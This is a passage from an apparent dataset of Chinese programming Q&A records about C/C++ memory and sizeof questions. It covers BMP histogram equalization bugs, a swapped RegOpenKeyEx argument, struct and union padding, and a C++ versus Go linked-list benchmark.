class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;; i&amp;#43;&amp;#43;)\n{\n    gailvhe &amp;#43;&amp;#61; (&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)R_ZFT[i] / ((&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)BITMAPINFOHEADER.biWidth * (&lt;span class=\"hljs-type\"&gt;double&lt;/span&gt;)BITMAPINFOHEADER.biHeight);\n    R_GL[i] &amp;#61; gailvhe;\n}\n\n&lt;span class=\"hljs-type\"&gt;uint32_t&lt;/span&gt; B_CS[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;], G_CS[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;], R_CS[&lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;];\n&lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=\"hljs-number\"&gt;256&lt;/span&gt;; i&amp;#43;&amp;#43;)\n{\n    B_CS[i] &amp;#61; (&lt;span class=\"hljs-type\"&gt;uint32_t&lt;/span&gt;)(B_GL[i] * &lt;span class=\"hljs-number\"&gt;255&lt;/span&gt;);\n    G_CS[i] &amp;#61; (&lt;span class=\"hljs-type\"&gt;uint32_t&lt;/span&gt;)(G_GL[i] * &lt;span class=\"hljs-number\"&gt;255&lt;/span&gt;);\n    R_CS[i] &amp;#61; (&lt;span class=\"hljs-type\"&gt;uint32_t&lt;/span&gt;)(R_GL[i] * &lt;span class=\"hljs-number\"&gt;255&lt;/span&gt;);\n}\n\n&lt;span class=\"hljs-comment\"&gt;// 创建输出文件&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;fopen_s&lt;/span&gt;(&amp;amp;out, &lt;span class=\"hljs-string\"&gt;&amp;#34;output.bmp&amp;#34;&lt;/span&gt;, &lt;span class=\"hljs-string\"&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;);\n&lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (!out) {\n    &lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Error creating output file!\\n&amp;#34;&lt;/span&gt;);\n    &lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(pixels);\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n}\n\n&lt;span class=\"hljs-comment\"&gt;// 写入文件头信息块&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;fwrite&lt;/span&gt;(&amp;amp;BITMAPFILEHEADER, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(TBH), &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, out);\n\n&lt;span class=\"hljs-comment\"&gt;// 写入图像描述信息块&lt;/span&gt;\n&lt;span class=\"hljs-built_in\"&gt;fwrite&lt;/span&gt;(&amp;amp;BITMAPINFOHEADER, &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(TBI), &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, out);\n\n&lt;span class=\"hljs-comment\"&gt;// 写入像素数据&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; BITMAPINFOHEADER.biWidth * BITMAPINFOHEADER.biHeight; i&amp;#43;&amp;#43;)\n{\n    pixels[i].b &amp;#61; B_CS[pixels[i].b];\n    pixels[i].g &amp;#61; G_CS[pixels[i].g];\n    pixels[i].r &amp;#61; R_CS[pixels[i].r];\n}\n\n&lt;span class=\"hljs-built_in\"&gt;fwrite&lt;/span&gt;(pixels, &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, imageSize, out);\n\n&lt;span class=\"hljs-comment\"&gt;// 写入填充字节&lt;/span&gt;\nBYTE padding[&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;] &amp;#61; { &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt; };\n&lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; paddingSize; i&amp;#43;&amp;#43;) {\n    &lt;span class=\"hljs-built_in\"&gt;fwrite&lt;/span&gt;(padding, &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, out);\n}\n\n&lt;span class=\"hljs-built_in\"&gt;fclose&lt;/span&gt;(out);\n&lt;span class=\"hljs-built_in\"&gt;free&lt;/span&gt;(pixels);\n\n&lt;span class=\"hljs-built_in\"&gt;printf&lt;/span&gt;(&lt;span class=\"hljs-string\"&gt;&amp;#34;Done!\\n&amp;#34;&lt;/span&gt;);\n&lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n\n\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["BMP图像直方图均衡化算法程序为什么出来的图片无法显示呀", ["BMP图像直方图均衡化算法程序为什么出来的图片无法显示呀", "\n", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "<malloc.h>", "\n", "#", "include", " ", "<stdint.h>", "\n", "typedef", " ", "unsigned", " ", "char", " BYTE;  ", "// 定义BYTE为一个字节的类型", "\n", "typedef", " ", "unsigned", " ", "short", " WORD; ", "// 定义WORD为两个字节的类型", "\n", "typedef", " ", "unsigned", " ", "int", " DWORD;  ", "// 定义DWORD为四个字节的类型", "\n", "typedef", " ", "struct", " ", "PerPixelgbr", "\n{\n    BYTE b;\n    BYTE g;\n    BYTE r;\n}BGR;\n", "//14 Bytes 文件头信息块", "\n", "typedef", " ", "struct", " ", "tBITMAPFILEHEADER", "\n{\n    DWORD    bfSize;            ", "//图片大小", "\n    DWORD        bfReserved;    ", "//保留字;    ", "\n    DWORD    bfOffBits;        ", "//文件头到像素数据偏移量", "\n}TBH;\n", "//40 Bytes 图像描述信息块", "\n", "typedef", " ", "struct", " ", "tBITMAPINFOHEADER", "\n{\n    DWORD    biSize;    ", "//此结构体大小，换成kb除以1024", "\n    DWORD    biWidth;            ", "//宽          ", "\n    DWORD    biHeight;            ", "//高", "\n    WORD        biPlanes;        ", "//平面显示属，一般显示器只有一个平面所以为1", "\n    WORD        biBitCount;        ", "//一个像素所占的位数，一般为24，带A通道的有32", "\n    DWORD    biCompression;    ", "//图像数据压缩的类，0为不压缩", "\n    DWORD    biSizeImage;    ", "//像素数据所占的大小 =bfSize-bfOffBits", "\n    DWORD    biXPelsPerMeter;", "//水平分辨率", "\n    DWORD    biYPelsPerMeter;", "//垂直分辨率", "\n    DWORD    biClrUsed;        ", "//位图实际使用的彩表的彩色索引数，为0证明全部使用", "\n    DWORD    biClrImportant;    ", "//说明对图象显示有重要影响的颜色索引数，如果是0，表示无差别", "\n}TBI;\n", "int", " ", "main", "()", "\n", "{\n    FILE* in;\n    FILE* out;\n    TBH* BITMAPFILEHEADER;\n    TBI* BITMAPINFOHEADER;\n    BGR* duqu;\n    BITMAPFILEHEADER = (TBH*)", "malloc", "(", "sizeof", "(TBH));\n    BITMAPINFOHEADER = (TBI*)", "malloc", "(", "sizeof", "(TBI));\n    duqu = (BGR*)", "malloc", "(", "sizeof", "(BGR));\n    ", "fopen_s", "(&in, ", "\"E:\\\\121.bmp\"", ", ", "\"rb\"", ");\n    WORD  fileType;\n    ", "fread", "(&fileType, ", "sizeof", "(", "unsigned", " ", "short", "), ", "1", ", in);\n    ", "if", "(fileType == ", "0x4d42", ")\n    {\n        ", "printf", "(", "\"文件类型标识正确\\n\"", ");\n    }", "//判断是不是bmp文件", "\n    ", "else", "{}\n    ", "fread", "(BITMAPFILEHEADER, ", "sizeof", "(TBH), ", "1", ", in);", "//读取 14 Bytes 文件头信息块", "\n    ", "fread", "(BITMAPINFOHEADER, ", "sizeof", "(TBI), ", "1", ", in);", "//读取 40 Bytes 图像描述信息块", "\n    ", "int", " W, H;\n    W = (BITMAPINFOHEADER->biWidth);", "//得到宽度", "\n    H = (BITMAPINFOHEADER->biHeight);", "//得到长度", "\n    ", "uint32_t", " B_ZFT[", "256", "] = { ", "0", " }, G_ZFT[", "256", "] = { ", "0", " }, R_ZFT[", "256", "] = { ", "0", " };\n    ", "uint32_t", " B_CS[", "256", "], G_CS[", "256", "], R_CS[", "256", "];\n    ", "double", " B_GL[", "256", "], G_GL[", "256", "], R_GL[", "256", "];\n    ", "double", " gailvhe = ", "0", ";\n    ", "//fseek(in, 18, SEEK_SET);", "\n    ", "//fread(&W, 4, 1, in);", "\n    ", "//fseek(in, 22, SEEK_SET);", "\n    ", "//fread(&H, 4, 1, in);", "\n    ", "//fseek(in, 54, SEEK_SET);", "\n    ", "for", " (", "int", " i = W * H; i > ", "0", "; i--)\n    {\n        ", "fread", "(duqu,  ", "sizeof", "(BGR), ", "1", ", in);\n        B_ZFT[(duqu->b)]++;\n        G_ZFT[(duqu->g)]++;\n        R_ZFT[(duqu->r)]++;\n    }\n    ", "free", "(duqu);\n    ", "for", " (", "int", " i = ", "0", "; i < ", "256", "; i++)\n    {\n        gailvhe += (", "double", ")B_ZFT[i] / ((", "double", ")W * (", "double", ")H);\n        B_GL[i] = gailvhe;\n    }\n    ", "printf", "(", "\"%lf\"", ", gailvhe);\n    gailvhe = ", "0", ";\n    ", "for", " (", "int", " i = ", "0", "; i < ", "256", "; i++)\n    {\n        gailvhe += (", "double", ")G_ZFT[i] / ((", "double", ")W * (", "double", ")H);\n        G_GL[i] = gailvhe;\n    }\n    ", "printf", "(", "\"%lf\"", ", gailvhe);\n    gailvhe = ", "0", ";\n    ", "for", " (", "int", " i = ", "0", "; i < ", "256", "; i++)\n    {\n        gailvhe += (", "double", ")R_ZFT[i] / ((", "double", ")W * (", "double", ")H);\n        R_GL[i] = gailvhe;\n    }\n    ", "printf", "(", "\"%lf\"", ", gailvhe);\n    ", "for", " (", "int", " i = ", "0", "; i < ", "256", "; i++)\n    {\n        B_CS[i] = (", "uint32_t", ")(B_GL[i] * ", "255", ");\n        G_CS[i] = (", "uint32_t", ")(G_GL[i] * ", "255", ");\n        R_CS[i] = (", "uint32_t", ")(R_GL[i] * ", "255", ");\n    }\n    BGR* xielu = (BGR*)", "malloc", "(", "sizeof", "(BGR));\n    duqu = (BGR*)", "malloc", "(", "sizeof", "(BGR));\n    ", "fseek", "(in, ", "54", ", SEEK_SET);\n    ", "fopen_s", "(&out, ", "\"E:\\\\12121.bmp\"", ", ", "\"wb\"", ");\n    ", "fwrite", "(&fileType, ", "2", ", ", "1", ", out);\n    ", "fwrite", "(&BITMAPFILEHEADER, ", "sizeof", "(TBH), ", "1", ", out);\n    ", "fwrite", "(&BITMAPINFOHEADER, ", "sizeof", "(TBI), ", "1", ", out);\n    ", "//fseek(out, 54, SEEK_SET);", "\n    ", "for", " (", "int", " i = W * H; i > ", "0", "; i--)\n    {\n        ", "fread", "(duqu, ", "sizeof", "(BGR), ", "1", ", in);\n        (xielu->b) = B_CS[(duqu->b)];\n        (xielu->g) = G_CS[(duqu->g)];\n        (xielu->r) = R_CS[(duqu->r)];\n        ", "fwrite", "(&xielu, ", "sizeof", "(BGR), ", "1", ", out);\n    }\n    ", "free", "(duqu);\n    ", "free", "(xielu);\n    ", "fclose", "(in);\n    ", "fclose", "(out);\n    ", "return", " ", "0", ";\n}\n"]], "Tag": "程序设计"}
{"Answer": "找到原因了，RegOpenKeyEx函数的参数你写倒了，第三位是ulOption保留，通常必须设置为0，第四位是samDesired用来设置对键访问的权限，你刚好写反了。\r\n```\r\nlRegRet = RegOpenKeyEx(HKEY_CURRENT_USER, USER_ENVREG, 0, KEY_ALL_ACCESS, &amp;hKeyUser);\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["RegOpenKeyEx调用失败返回5 ，管理员运行不管用 win7VS2013 请问怎么回事？", ["代码", "\nLONG lRegRet;", "\nHLOCAL hLocal;", "\nHKEY hKeyUser;", "\nPTSTR pszEnvironmentName = NULL;", "\nPTSTR pszEnvironmentValue = NULL;", "\n\n", "pszEnvironmentName = (PTSTR)malloc(MAX_PATH * sizeof(TCHAR));", "\nGetDlgItemText(hDlg, IDD_EDIT_NAME, pszEnvironmentName, MAX_PATH);", "\n\n", "pszEnvironmentValue = (PTSTR)malloc(1024 * sizeof(TCHAR) * 3);", "\nGetDlgItemText(hDlg, IDD_EDIT_VALUE, pszEnvironmentValue, ", "\n1024 * sizeof(TCHAR) * 3);", "\n\n", "//修改用户环境变量", "\nlRegRet = RegOpenKeyEx(HKEY_CURRENT_USER, USER_ENVREG, KEY_ALL_ACCESS, 0, &hKeyUser);", "\nif (lRegRet != ERROR_SUCCESS)", "\n{", "\nFormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |", "\nFORMAT_MESSAGE_IGNORE_INSERTS, NULL, lRegRet,", "\nMAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PTSTR)&hLocal, 0, NULL);", "\n\n", "MessageBox(hDlg, (PCTSTR)LocalLock(hLocal), TEXT(\"错误\"), MB_OK);", "\nbreak;", "\n}", "\nRegSetValueEx(hKeyUser, pszEnvironmentName, 0, REG_SZ,", "\n(const unsigned char *)pszEnvironmentValue, ", "\nwcslen(pszEnvironmentValue) + sizeof(TCHAR));", "\nRegCloseKey(hKeyUser);", "\nSendMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0, (LPARAM)TEXT(\"Environment\"));", "\n\n", "//释放分配的内存", "\nfree(pszEnvironmentValue);", "\nfree(pszEnvironmentName);"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;第一个  a[10]  十个int元素   4*10&amp;#61;40字节&lt;br /&gt;第二个 int型地址   4字节(其实就相当于一个int* 指针的大小)&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么第一个输出40，第二个输出4?", ["int a[10] = { 1, 2, 3, 4, 5 };", "    printf(\"%d    \\n\", sizeof(a));", "\n", "int main(int a[10]) {        // ", "\n", "printf(", "\"%d    \\n\"", ", sizeof(", "a", "))", ";", "\nprintf(", "\"%d    \\n\"", ", sizeof(", "&a", "))", ";", "\n", "\n", "};"]], "Tag": "程序设计"}
{"Answer": "&lt;ul&gt;&lt;li&gt;共用体内存长度是内部最长的数据类型的长度&amp;#xff1b;共用体的地址和内部各成员变量的地址都是同一个地址&amp;#xff1b;&lt;/li&gt;&lt;li&gt;结构体大小结果要为成员中最大字节的整数倍&lt;/li&gt;&lt;/ul&gt;\n&lt;p&gt;PS&amp;#xff1a;&lt;br /&gt;&lt;a href=\"https://zhuanlan.zhihu.com/p/30007037\" id=\"textarea_1671542825627_1671543778702_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;div class=\"md_link_card\"&gt;\n      \n        &lt;span class=\"md_link_title\"&gt;C/C&amp;#43;&amp;#43;内存对齐详解 - 知乎&lt;/span&gt;\n        \n      &lt;span class=\"md_link_desc\" style=\"\"&gt;1、什么是内存对齐还是用一个例子带出这个问题&amp;#xff0c;看下面的小程序&amp;#xff0c;理论上&amp;#xff0c;32位系统下&amp;#xff0c;int占4byte&amp;#xff0c;char占一个byte&amp;#xff0c;那么将它们放到一个结构体中应该占4&amp;#43;1&amp;#61;5byte&amp;#xff1b;但是实际上&amp;#xff0c;通过运行程序得到的结果是8 byte&amp;#xff0c;这…&lt;/span&gt;\n      &lt;span class=\"md_flex_card\"&gt;\n      &lt;img class=\"md_link_img\" id=\"md_link_img\" src=\"https://static.zhihu.com/heifetz/assets/apple-touch-icon-152.81060cab.png\" /&gt;\n        &lt;span class=\"flex-1 md_link_url\"&gt;\n         https://zhuanlan.zhihu.com/p/30007037\n        &lt;/span&gt;\n      &lt;/span&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img class=\"md_img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/545687145176165.png\" alt=\"img\" align=\"left\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;br /&gt;\n\n&lt;p&gt;&lt;b&gt;如有帮助&amp;#xff0c;欢迎点赞&amp;#43;采纳哈&amp;#xff01;&lt;/b&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["实在不会了，这个结构体的字节长为什么会是32呢？代码已有求解释", ["\n", "#", "include", "<stdio.h>", "\n", "int", " ", "main", "()", "{\n    ", "typedef", " ", "union", "{\n", "long", " i;\n", "int", " k[", "5", "];\n\n", "char", " c;\n}DATE;\n", "struct", " ", "date", "{\n", "int", " cat;\nDATE cow;\n", "double", " dog;\n}too;\nDATE max;\n\n    ", "printf", " (", "\"%d\\n\"", ", ", "sizeof", "(", "struct", " date));\n    ", "printf", " (", "\"%d\\n\"", ", ", "sizeof", "(", "struct", " date) +", "sizeof", "(max));\n\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;你意思是用char *p是编译报错吗&amp;#xff1f;贴一下错误提示信息&lt;br /&gt;代码测试没有问题啊&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["对字符串指针使用strcpy()报错，如何解决？(语言-c语言)", ["给字符串指针p分配空间后,strcpy拷贝字符串内容会写入错误", "\n", "#", "include", "<stdio.h>", "\n", "#", "include", "<string.h>", "\n", "int", " ", "main", "()", " ", "{\n    ", "char", "* p = (", "char", " *)", "malloc", "(", "sizeof", "(", "char", ")*", "100", ");\n    ", "strcpy", "(p, ", "\"qwerasd\"", ");\n    ", "return", " ", "0", ";\n}\n", "\n", "\n", "将p改为数组p", "\n", "      ", "char", " p[", "100", "];\n    ", "strcpy", "(p, ", "\"qwerasd\"", ");\n", "\n", "编译就能通过", "\n", "p指针明明都指向了一片空的内存,为什么无法拷入字符串?"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;p&gt;The big difference between your two programs is that your Go code ignores errors (and will panic or segfault, if you're lucky, if you empty the pool), while your C++ code propagates errors via exception. Compare:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;if p.size == 0 {\n    fmt.Printf(\"Attempting to pop from empty pool!\n\")\n}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;vs.&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;if(_size == 0){throw std::out_of_range(\"\");}\n&lt;/code&gt;&lt;/pre&gt;\n\n&lt;hr&gt;\n\n&lt;p&gt;There are at least three ways&lt;sup&gt;1&lt;/sup&gt; to make the comparison fair:&lt;/p&gt;\n\n&lt;ol&gt;\n&lt;li&gt;Can change the C++ code to ignore the error, as you do in Go,&lt;/li&gt;\n&lt;li&gt;Change both versions to &lt;code&gt;panic&lt;/code&gt;/&lt;code&gt;abort&lt;/code&gt; on error.&lt;/li&gt;\n&lt;li&gt;Change the Go version to handle errors idiomatically,&lt;sup&gt;2&lt;/sup&gt; as you do in C++.&lt;/li&gt;\n&lt;/ol&gt;\n\n&lt;p&gt;So, let's do all of them and compare the results&lt;sup&gt;3&lt;/sup&gt;:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;C++ ignoring error:  1.059329s wall, 1.050000s user + 0.000000s system = 1.050000s CPU (99.1%)&lt;/li&gt;\n&lt;li&gt;C++ abort on error:  1.081585s wall, 1.060000s user + 0.000000s system = 1.060000s CPU (98.0%)&lt;/li&gt;\n&lt;li&gt;Go panic on error: Time elapsed: 1.152942427s&lt;/li&gt;\n&lt;li&gt;Go ignoring error: Time elapsed: 1.196426068s&lt;/li&gt;\n&lt;li&gt;Go idiomatic error handling: Time elapsed: 1.322005119s&lt;/li&gt;\n&lt;li&gt;C++ exception:  1.373458s wall, 1.360000s user + 0.000000s system = 1.360000s CPU (99.0%)&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;hr&gt;\n\n&lt;p&gt;So:&lt;/p&gt;\n\n&lt;ul&gt;\n&lt;li&gt;Without error handling, C++ is faster than Go.&lt;/li&gt;\n&lt;li&gt;With panicking, Go gets faster,&lt;sup&gt;4&lt;/sup&gt; but still not as fast as C++.&lt;/li&gt;\n&lt;li&gt;With idiomatic error handling, C++ slows down a lot more than Go.&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;Why? This exception never actually happens in your test run, so the actual error-handling code never runs in either language. But &lt;code&gt;clang&lt;/code&gt; can't prove that it doesn't happen. And, since you never &lt;code&gt;catch&lt;/code&gt; the exception anywhere, that means it has to emit exception handlers and stack unwinders for every non-elided frame all the way up the stack. So it's doing more work on each function call and return—not &lt;em&gt;much&lt;/em&gt; more work, but then your function is doing so little real work that the unnecessary extra work adds up.&lt;/p&gt;\n\n&lt;hr&gt;\n\n&lt;p&gt;&lt;sub&gt;1. You could also change the C++ version to do C-style error handling, or to use an Option type, and probably other possibilities.&lt;/sub&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;sub&gt;2. This, of course, requires a lot more changes: you need to import &lt;code&gt;errors&lt;/code&gt;, change the return type of &lt;code&gt;Acquire&lt;/code&gt; to &lt;code&gt;(*Node, error)&lt;/code&gt;, change the return type of &lt;code&gt;processAge&lt;/code&gt; to &lt;code&gt;error&lt;/code&gt;, change all your &lt;code&gt;return&lt;/code&gt; statements, and add at least two &lt;code&gt;if err != nil { … }&lt;/code&gt; checks. But that's supposed to be a good thing about Go, right?&lt;/sub&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;sub&gt;3. While I was at it, I replaced your legacy &lt;code&gt;boost::timer&lt;/code&gt; with &lt;code&gt;boost::auto_cpu_timer&lt;/code&gt;, so we're now seeing wall clock time (as with Go) as well as CPU time.&lt;/sub&gt;&lt;/p&gt;\n\n&lt;p&gt;&lt;sub&gt;4. I won't attempt to explain why, because I don't understand it. From a quick glance at the assembly, it's clearly optimized out some checks, but I can't see why it couldn't optimize out those same checks without the &lt;code&gt;panic&lt;/code&gt;.&lt;/sub&gt;&lt;/p&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["与类似的内存访问相比，C ++中的链表迭代比Go中的慢", ["\n\n", "In a variety of contexts I've observed that linked list iteration is consistently slower in C++ than in Go by 10-15%. My first attempt at resolving this mystery on Stack Overflow is ", "here", ". The example I coded up was problematic because:", "\n\n", "1) memory access was unpredictable because of heap allocations, and ", "\n\n", "2) because there was no actual work being done, some people's compilers were optimizing away the main loop.", "\n\n", "To resolve these issues I have a new program with implementations in C++ and Go. The C++ version takes 1.75 secs compared to 1.48 secs for the Go version. This time, I do one large heap allocation before timing begins and use it to operate an object pool from which I release and acquire nodes for the linked list. This way the memory access should be completely analogous between the two implementations.", "\n\n", "Hopefully this makes the mystery more reproducible!", "\n\n", "C++:", "\n\n", "#include <iostream>\n#include <sstream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <boost/timer.hpp>\n\nusing namespace std;\n\nstruct Node {\n    Node *next; // 8 bytes\n    int age;   // 4 bytes\n};\n\n// Object pool, where every free slot points to the previous free slot\ntemplate<typename T, int n>\nstruct ObjPool\n{\n    typedef T*       pointer;\n    typedef pointer* metapointer;\n\n    ObjPool() :\n        _top(NULL),\n        _size(0)\n    {\n        pointer chunks = new T[n];\n        for (int i=0; i < n; i++) {\n            release(&chunks[i]);\n        }\n    }\n\n    // Giver an available pointer to the object pool\n    void release(pointer ptr)\n    {\n        // Store the current pointer at the given address\n        *(reinterpret_cast<metapointer>(ptr)) = _top;\n\n        // Advance the pointer\n        _top = ptr;\n\n        // Increment the size\n        ++_size;\n    }\n\n    // Pop an available pointer off the object pool for program use\n    pointer acquire(void)\n    {\n        if(_size == 0){throw std::out_of_range(\"\");}\n\n        // Pop the top of the stack\n        pointer retval = _top;\n\n        // Step back to the previous address\n        _top = *(reinterpret_cast<metapointer>(_top));\n\n        // Decrement the size\n        --_size;\n\n        // Return the next free address\n        return retval;\n    }\n\n    unsigned int size(void) const {return _size;}\n\nprotected:\n    pointer _top;\n\n    // Number of free slots available\n    unsigned int _size;\n};\n\nNode *nodes = nullptr;\nObjPool<Node, 1000> p;\n\nvoid processAge(int age) {\n    // If the object pool is full, pop off the head of the linked list and release\n    // it from the pool\n    if (p.size() == 0) {\n        Node *head = nodes;\n        nodes = nodes->next;\n        p.release(head);\n    }\n\n    // Insert the new Node with given age in global linked list. The linked list is sorted by age, so this requires iterating through the nodes.\n    Node *node = nodes;\n    Node *prev = nullptr;\n    while (true) {\n        if (node == nullptr || age < node->age) {\n            Node *newNode = p.acquire();\n            newNode->age = age;\n            newNode->next = node;\n\n            if (prev == nullptr) {\n                nodes = newNode;\n            } else {\n                prev->next = newNode;\n            }\n\n            return;\n        }\n\n        prev = node;\n        node = node->next;\n    }\n}\n\nint main() {\n    Node x = {};\n    std::cout << \"Size of struct: \" << sizeof(x) << \"\n\"; // 16 bytes\n\n    boost::timer t;\n    for (int i=0; i<1000000; i++) {\n        processAge(i);\n    }\n\n    std::cout << t.elapsed() << \"\n\";\n}\n", "\n\n", "Go:", "\n\n", "package main\n\nimport (\n    \"time\"\n    \"fmt\"\n    \"unsafe\"\n)\n\ntype Node struct {\n    next *Node // 8 bytes\n    age int32 // 4 bytes\n}\n\n// Every free slot points to the previous free slot\ntype NodePool struct {\n    top *Node\n    size int\n}\n\nfunc NewPool(n int) NodePool {\n    p := NodePool{nil, 0}\n    slots := make([]Node, n, n)\n    for i := 0; i < n; i++ {\n        p.Release(&slots[i])\n    }\n\n    return p\n}\n\nfunc (p *NodePool) Release(l *Node) {\n    // Store the current top at the given address\n    *((**Node)(unsafe.Pointer(l))) = p.top\n    p.top = l\n    p.size++\n}\n\nfunc (p *NodePool) Acquire() *Node {\n    if p.size == 0 {\n        fmt.Printf(\"Attempting to pop from empty pool!\n\")\n    }\n    retval := p.top\n\n    // Step back to the previous address in stack of addresses\n    p.top = *((**Node)(unsafe.Pointer(p.top)))\n    p.size--\n    return retval\n}\n\nfunc processAge(age int32) {\n    // If the object pool is full, pop off the head of the linked list and release\n    // it from the pool\n    if p.size == 0 {\n        head := nodes\n        nodes = nodes.next\n        p.Release(head)\n    }\n\n    // Insert the new Node with given age in global linked list. The linked list is sorted by age, so this requires iterating through the nodes.\n    node := nodes\n    var prev *Node = nil\n    for true {\n        if node == nil || age < node.age {\n            newNode := p.Acquire()\n            newNode.age = age\n            newNode.next = node\n\n            if prev == nil {\n                nodes = newNode\n            } else {\n                prev.next = newNode\n            }\n            return\n        }\n\n        prev = node\n        node = node.next\n    }\n}\n\n// Linked list of nodes, in ascending order by age\nvar nodes *Node = nil\nvar p NodePool = NewPool(1000)\n\nfunc main() {\n    x := Node{};\n    fmt.Printf(\"Size of struct: %d\n\", unsafe.Sizeof(x)) // 16 bytes\n\n    start := time.Now()\n    for i := 0; i < 1000000; i++ {\n        processAge(int32(i))\n    }\n\n    fmt.Printf(\"Time elapsed: %s\n\", time.Since(start))\n}\n", "\n\n", "Output:", "\n\n", "clang++ -std=c++11 -stdlib=libc++ minimalPool.cpp -O3; ./a.out\nSize of struct: 16\n1.7548\n\ngo run minimalPool.go\nSize of struct: 16\nTime elapsed: 1.487930629s\n", "\n    "]], "Tag": "程序设计"}
{"Answer": "不同数据类型的字长跟编译器和具体的机器型号有关，但是2,4这个结果在现代普通的PC上还是显得不太正常。建议将代码改为`s=sizeof(int); t=sizeof(double);`再测试一下。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在VC6.0上做的，求大神解惑", ["＃include ", "\nmain()", "\n{ int s,t， A=10；double  B=6;", "\ns=sizeof(A);   t=sizeof(B);", "\nprintf(\"％d,％d/n\",s,t);}", "\n输出结果为什么是2，4   ???"]], "Tag": "程序设计"}
{"Answer": "&lt;ul&gt;&lt;li&gt;你可以看下这个问题的回答&lt;a href=\"https://ask.csdn.net/questions/7689324\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;font size=\"3\"&gt;https://ask.csdn.net/questions/7689324&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在写循环队列的时候在初始化那里碰到了写入内存访问冲突的报错，找半天找不出原因，能帮我看看吗", ["第31行提示的", "\n", "\n", "#include ", "#include <stdlib.h>", "#define Maxsize 10", "using namespace std;", "\n", "class Queue", "{", "private:", "    int data[Maxsize];", "    int front, rear;", "public:", "    Queue* InitQueue(Queue* q)", "    {", "        q = (Queue*)malloc(sizeof(Queue));", "        q->front = q->rear = 0;", "        return q;", "    }", "    bool IsEmpty(Queue* q)", "    {", "        return q->front == q->rear;", "    }", "    bool DeleteQueue(Queue*& q)", "    {", "        delete q;", "    }", "    bool InQueue(Queue*& q, int e)", "    {", "        if ((q->rear + 1) % Maxsize == q->front)", "            return false;", "        q->data[rear] = e;", "        q->rear = (q->rear + 1) % Maxsize;", "        return true;", "    }", "    bool OutQueue(Queue*& q, int e)", "    {", "        if (q->front == 